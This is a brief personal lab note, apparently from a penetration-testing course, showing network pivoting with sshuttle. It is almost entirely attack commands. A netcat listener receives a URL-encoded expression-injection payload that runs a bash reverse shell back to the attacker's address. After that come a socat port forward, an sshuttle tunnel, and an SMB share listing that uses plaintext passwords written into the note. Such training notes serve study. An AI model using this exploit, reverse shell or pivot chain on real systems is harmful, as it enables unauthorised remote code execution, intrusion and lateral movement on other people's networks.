
# Using sshuttle
Terminal01
```bash
rlwrap nc -nlvp 4444
```

Terminal02
```bash
curl http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.236/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

Terminal01
```
socat TCP-LISTEN:2222,fork TCP:10.4.158.215:22
```

Terminal02
```bash
sshuttle -r database_admin@192.168.158.63:2222 10.4.158.0/24 172.16.158.0/24
sqlpass123
```

Terminal03
```bash
smbclient -L //172.16.158.217/ -U hr_admin --password=Welcome1234
```

![[Pasted image 20260508224221.png]]

---